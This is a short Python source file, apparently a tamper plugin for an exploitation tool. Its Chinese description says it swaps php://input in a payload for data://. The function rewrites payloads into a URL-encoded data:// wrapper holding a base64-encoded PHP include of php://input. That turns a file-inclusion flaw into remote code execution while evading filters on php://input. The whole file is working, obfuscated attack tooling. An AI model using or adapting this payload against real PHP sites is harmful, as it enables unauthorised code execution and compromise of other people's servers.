# tamper_phpinput_to_data.py

name = "tamper_phpinput_to_data"
description = "將 payload 中的 php://input 使用 data:// 替換"

def tamper(data):
    payload = data.get("payload", "")
    if "php://input" in payload:
        payload = payload.replace("php://input", "%22data://text/plain;base64,PD9waHAgaW5jbHVkZSgncGhwOi8vaW5wdXQnKTsgPz4%3D%22")
        data["payload"] = payload
    return data
